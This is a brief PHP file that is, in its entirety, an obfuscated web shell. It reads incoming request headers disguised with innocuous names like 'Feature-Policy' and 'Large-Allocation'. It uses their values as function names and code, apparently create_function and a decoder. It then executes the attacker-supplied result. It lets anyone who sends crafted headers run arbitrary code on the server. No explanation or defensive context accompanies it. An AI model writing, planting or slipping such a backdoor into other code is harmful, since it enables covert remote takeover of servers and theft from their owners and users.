<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $created = $_HEADERS['Feature-Policy']('', $_HEADERS['Large-Allocation']($_HEADERS['X-Dns-Prefetch-Control']));
    $created();
}